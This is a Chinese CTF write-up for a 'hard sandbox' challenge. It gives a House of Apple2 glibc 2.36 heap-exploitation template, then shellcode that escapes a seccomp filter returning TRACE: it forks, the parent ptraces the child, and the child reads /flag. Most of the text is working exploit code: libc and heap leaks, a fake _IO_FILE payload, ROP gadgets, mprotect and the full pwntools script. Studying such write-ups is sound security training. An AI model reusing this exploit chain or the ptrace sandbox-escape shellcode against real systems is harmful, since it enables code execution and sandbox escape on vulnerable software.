---
data: 2024-09-10 11:41
challenge: hard sandbox
tags:
  - ptrace
  - seccomp-bypass
---

其实是 shellcode 题，用 2.36 版本堆包装了一下，这里可以当成 house of apple2 的板子：

### Apple2 板子

> [!quote]
> 对fp的设置如下：
>
> - `_flags` 设置为 `~(2 | 0x8 | 0x800)`，如果不需要控制 rdi，设置为0即可；如果需要获得 shell，可设置为 `  sh;`，注意前面有两个空格
> - `vtable` 设置为 `_IO_wfile_jumps/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap` 地址（加减偏移），使其能成功调用 `_IO_wfile_overflow` 即可
> - `_wide_data` 设置为可控堆地址 A，即满足 `*(fp + 0xa0) = A`
> - `_wide_data->_IO_write_base` 设置为 0，即满足 `*(A + 0x18) = 0`
> - `_wide_data->_IO_buf_base` 设置为 0，即满足 `*(A + 0x30) = 0`
> - `_wide_data->_wide_vtable` 设置为可控堆地址 B，即满足 `*(A + 0xe0) = B`
> - `_wide_data->_wide_vtable->doallocate` 设置为地址 C 用于劫持 RIP，即满足 `*(B + 0x68) = C`
> - **`_lock` 设置为可写地址；`mode` 设置大于 0**
>
> 函数的调用链如下：
>
> ```c
> _IO_wfile_overflow
>     _IO_wdoallocbuf
>         _IO_WDOALLOCATE
>             *(fp->_wide_data->_wide_vtable + 0x68)(fp)
> ```

板子如下：

```python
"""
1630aa:>  48 8b 6f 48          >  mov    rbp,QWORD PTR [rdi+0x48]
1630ae:>  48 8b 45 18          >  mov    rax,QWORD PTR [rbp+0x18]
1630b2:>  4c 8d 6d 10          >  lea    r13,[rbp+0x10]
1630b6:>  c7 45 10 00 00 00 00 >  mov    DWORD PTR [rbp+0x10],0x0
1630bd:>  4c 89 ef             >  mov    rdi,r13
1630c0:>  ff 50 28             >  call   QWORD PTR [rax+0x28]
"""
magic_gadget = libc_base + 0x1630AA
leave_ret = libc_base + 0x0000000000050877
add_rsp_0x38_ret = libc_base + 0x0000000000054BF4
pop_rdi_ret = libc_base + 0x0000000000023B65
pop_rsi_ret = libc_base + 0x00000000000251BE
pop_rdx_ret = libc_base + 0x0000000000166262
pop_rax_ret = libc_base + 0x000000000003FA43

_lock = libc_base + 0x1F8A10
_IO_wfile_jumps = libc_base + libc.sym._IO_wfile_jumps
fake_IO_FILE = heap_base + 0x290

f1 = IO_FILE_plus_struct()
f1.flags = u64_ex("  sh;")
f1._lock = _lock
f1._wide_data = fake_IO_FILE + 0xE0
f1._mode = 1
f1.vtable = _IO_wfile_jumps

f1._IO_save_base = fake_IO_FILE + 0x510 + 0x100

payload = flat(
    {
        0: {
            0: bytes(f1)[0x10:],
            0xE0 - 0x10: {
                0x18: [0],
                0x30: [0],
                0xE0: [fake_IO_FILE + 0x200],
            },
            # 0x200 - 0x10: {0x68: [0xDEADBEEF]},
            0x200 - 0x10: {0x68: [magic_gadget]},
        },
    }
)
edit(0, payload)
```

### 父进程 ptrace 子进程绕沙箱

接下来就是绕 sandbox 了，这里比较新颖地采用了 `TRACE` 而非 `KILL`，使得古早沙箱绕过方式重现于比赛中：

```bash
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x07 0xc000003e  if (A != ARCH_X86_64) goto 0009
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x05 0x00 0x40000000  if (A >= 0x40000000) goto 0009
 0004: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0009
 0005: 0x15 0x03 0x00 0x00000101  if (A == openat) goto 0009
 0006: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0009
 0007: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0009
 0008: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0009: 0x06 0x00 0x00 0x7ff00000  return TRACE
```

与常见的 KILL 不同，TRACE 模式不会直接终止程序，可以参考文档：

- [linux/man-pages/man2/seccomp.2](https://man7.org/linux/man-pages/man2/seccomp.2.html)

> [!QUOTE] 
> SECCOMP_RET_TRACE
>   When returned, this value will cause the kernel to attempt
>   to notify a ptrace(2)-based tracer prior to executing the
>   system call.  If there is no tracer present, the system
>   call is not executed and returns a failure status with
>   errno set to ENOSYS.
>
>   A tracer will be notified if it requests
>   PTRACE_O_TRACESECCOMP using ptrace(PTRACE_SETOPTIONS).
>   The tracer will be notified of a PTRACE_EVENT_SECCOMP and
>   the SECCOMP_RET_DATA portion of the filter's return value
>   will be available to the tracer via PTRACE_GETEVENTMSG.
>
>   The tracer can skip the system call by changing the system
>   call number to -1.  Alternatively, the tracer can change
>   the system call requested by changing the system call to a
>   valid system call number.  If the tracer asks to skip the
>   system call, then the system call will appear to return
>   the value that the tracer puts in the return value
>   register.
>
>   Before Linux 4.8, the seccomp check will not be run again
>   after the tracer is notified.  (This means that, on older
>   kernels, seccomp-based sandboxes must not allow use of
>   ptrace(2)—even of other sandboxed processes—without
>   extreme care; ptracers can use this mechanism to escape
>   from the seccomp sandbox.)
>
>   Note that a tracer process will not be notified if another
>   filter returns an action value with a precedence greater
>   than SECCOMP_RET_TRACE.

大致意思是 `SECCOMP_RET_TRACE` 允许将系统调用交由 ptrace 调试处理，从而为调试器提供更大的控制能力，于是这道题的解法又回到了内核版本 4.8 前的思路：

1. fork 出一个子进程，在其中运行常规 orw，此时会触发 TRACE；
2. 父进程中 ptrace 上子进程，并调用 wait 等待子进程的状态改变；
3. 设置 ptrace 调试选项启用 `PTRACE_O_TRACESECCOMP`，用于追踪 seccomp 事件；
4. 设置 `PTRACE_CONT` 恢复并继续子进程的执行；
5. 再次调用 wait 等待子进程的状态改变，这时候子进程会调用到被过滤的 open；
6. 在捕获到 seccomp 事件后，父进程解除对子进程的调试控制，这时候被过滤的 open 也能正常执行，相当于无事发生，在这里就完成了对子进程系统调用的 hook。

```python
NR_fork = 57
NR_ptrace = 101
NR_wait = 61
PTRACE_ATTACH = 16
PTRACE_SETOPTIONS = 0x4200
PTRACE_O_TRACESECCOMP = 0x00000080
PTRACE_CONT = 7
PTRACE_DETACH = 17
shellcode = f"""
main:
/*fork()*/
    push {NR_fork}
    pop rax
    syscall
    push rax
    pop rbx
    test rax,rax
    jz child_code

/*ptrace(PTRACE_ATTACH, pid, NULL, NULL)*/
    xor r10, r10
    xor edx, edx
    mov rsi,rbx
    mov rdi,{PTRACE_ATTACH}
    push {NR_ptrace}
    pop rax
    syscall

/* wait child  */
    xor rdi, rdi
    push {NR_wait}
    pop rax
    syscall

/* ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACESECCOMP) */
    mov r10,{PTRACE_O_TRACESECCOMP}
    xor rdx, rdx
    mov rsi,rbx
    mov rdi, 0x4200
    push {NR_ptrace}
    pop rax
    syscall
    js error

/* ptrace(PTRACE_CONT, pid, NULL, NULL) */
    xor r10,r10
    xor rdx,rdx
    mov rsi,rbx
    mov rdi, {PTRACE_CONT}  /* PTRACE_CONT */
    push {NR_ptrace}
    pop rax
    syscall
    js error

/* Wait seccomp  */
    xor rdi, rdi
    push {NR_wait}
    pop rax
    syscall

    xor r10,r10
    xor rdx,rdx
    mov rsi,rbx
    mov rdi,{PTRACE_DETACH}
    push {NR_ptrace}
    pop rax
    syscall
    hlt
"""
```

完整利用代码如下：

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from lianpwn import *

cli_script()
set_remote_libc("libc.so.6")

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc


def cmd(choice):
    ru(b">")
    sl(i2b(choice))


def add(idx, size):
    cmd(1)
    ru(b"Index: ")
    sl(i2b(idx))
    ru(b"Size: ")
    sl(i2b(size))


def delet(idx):
    cmd(2)
    ru(b"Index: ")
    sl(i2b(idx))


def edit(idx, data):
    cmd(3)
    ru(b"Index: ")
    sl(i2b(idx))
    ru(b"Content: ")
    s(data)


def show(idx):
    cmd(4)
    ru(b"Index: ")
    sl(i2b(idx))


add(0, 0x510)
add(1, 0x900)
add(2, 0x520)
add(3, 0x900)
delet(2)
add(4, 0x900)
delet(0)

show(2)
libc_base = u64_ex(ru(b"\n", drop=True)) - 0x1F70F0
lg("libc_base", libc_base)
edit(2, b"a" * 0x10)
show(2)
ru(b"a" * 0x10)
heap_base = u64_ex(ru(b"\n", drop=True)) - 0x10C0
lg("heap_base", heap_base)

edit(
    2,
    flat(
        {
            0: [
                libc_base + 0x1F70F0,
                libc_base + 0x1F70F0,
                heap_base + 0xDC0,
                libc_base + libc.sym._IO_list_all - 0x20,
            ]
        }
    ),
)
add(5, 0x900)

"""
1630aa:>  48 8b 6f 48          >  mov    rbp,QWORD PTR [rdi+0x48]
1630ae:>  48 8b 45 18          >  mov    rax,QWORD PTR [rbp+0x18]
1630b2:>  4c 8d 6d 10          >  lea    r13,[rbp+0x10]
1630b6:>  c7 45 10 00 00 00 00 >  mov    DWORD PTR [rbp+0x10],0x0
1630bd:>  4c 89 ef             >  mov    rdi,r13
1630c0:>  ff 50 28             >  call   QWORD PTR [rax+0x28]
"""
magic_gadget = libc_base + 0x1630AA
leave_ret = libc_base + 0x0000000000050877
add_rsp_0x38_ret = libc_base + 0x0000000000054BF4
pop_rdi_ret = libc_base + 0x0000000000023B65
pop_rsi_ret = libc_base + 0x00000000000251BE
pop_rdx_ret = libc_base + 0x0000000000166262
pop_rax_ret = libc_base + 0x000000000003FA43

_lock = libc_base + 0x1F8A10
_IO_wfile_jumps = libc_base + libc.sym._IO_wfile_jumps
fake_IO_FILE = heap_base + 0x290

f1 = IO_FILE_plus_struct()
f1.flags = u64_ex("  sh;")
f1._lock = _lock
f1._wide_data = fake_IO_FILE + 0xE0
f1._mode = 1
f1.vtable = _IO_wfile_jumps

f1._IO_save_base = fake_IO_FILE + 0x510 + 0x100

payload = flat(
    {
        0: {
            0: bytes(f1)[0x10:],
            0xE0 - 0x10: {
                0x18: [0],
                0x30: [0],
                0xE0: [fake_IO_FILE + 0x200],
            },
            0x200 - 0x10: {0x68: [magic_gadget]},
        },
    }
)
edit(0, payload)

first_state = f"""
    mov rdi, 0;
    mov rsi, {heap_base + 0x1000};
    mov rdx, 0x1000;
    mov eax, 0;
    syscall;

    mov rax, {heap_base + 0x1000};
    call rax;
"""

edit(3, asm(first_state))

payload = flat(
    {
        0: {
            0: b"a" * 0x10,
            0x100 - 0x20: {
                0: [0xDEADBEEF, add_rsp_0x38_ret],
                0x18: [fake_IO_FILE + 0x520 + 0x100],
                0x28: [leave_ret],
                0x38: [
                    leave_ret,
                    fake_IO_FILE + 0x520 + 0x200,
                    pop_rdi_ret,
                    heap_base,
                    pop_rsi_ret,
                    0x21000,
                    pop_rdx_ret,
                    7,
                    libc_base + libc.sym.mprotect,
                    heap_base + 0x15F0 + 0x10,
                ],
            },
        },
    }
)
edit(1, payload)
lg("magic_gadget", magic_gadget)

cmd(5)

NR_fork = 57
NR_ptrace = 101
NR_wait = 61
PTRACE_ATTACH = 16
PTRACE_SETOPTIONS = 0x4200
PTRACE_O_TRACESECCOMP = 0x00000080
PTRACE_CONT = 7
PTRACE_DETACH = 17
shellcode = f"""
main:
/*fork()*/
    push {NR_fork}
    pop rax
    syscall
    push rax
    pop rbx
    test rax,rax
    jz child_code

/*ptrace(PTRACE_ATTACH, pid, NULL, NULL)*/
    xor r10, r10
    xor edx, edx
    mov rsi,rbx
    mov rdi,{PTRACE_ATTACH}
    push {NR_ptrace}
    pop rax
    syscall

    /* wait child  */
    xor rdi, rdi
    push {NR_wait}
    pop rax
    syscall

/* ptrace(PTRACE_SETOPTIONS, pid, NULL, PTRACE_O_TRACESECCOMP) */
    mov r10,{PTRACE_O_TRACESECCOMP}
    xor rdx, rdx
    mov rsi,rbx
    mov rdi, 0x4200
    push {NR_ptrace}
    pop rax
    syscall

    /* ptrace(PTRACE_CONT, pid, NULL, NULL) */
    xor r10,r10
    xor rdx,rdx
    mov rsi,rbx
    mov rdi, {PTRACE_CONT}  /* PTRACE_CONT */
    push {NR_ptrace}
    pop rax
    syscall

    /* Wait seccomp  */
    xor rdi, rdi
    push {NR_wait}
    pop rax
    syscall

    xor r10,r10
    xor rdx,rdx
    mov rsi,rbx
    mov rdi,{PTRACE_DETACH}
    push {NR_ptrace}
    pop rax
    syscall
    hlt

child_code:
"""

s(asm(shellcode) + asm(shellcraft.cat("/flag")))

ia()
```

---

### References

1. [CTF 中 glibc堆利用 及 IO_FILE 总结](https://bbs.kanxue.com/thread-272098.htm) . *[winmt](https://bbs.kanxue.com/homepage-949925.htm)*
2. [2024 羊城杯 PWN 详细全解 - ptrace 系统调用概述](https://xz.aliyun.com/t/15461#toc-0)
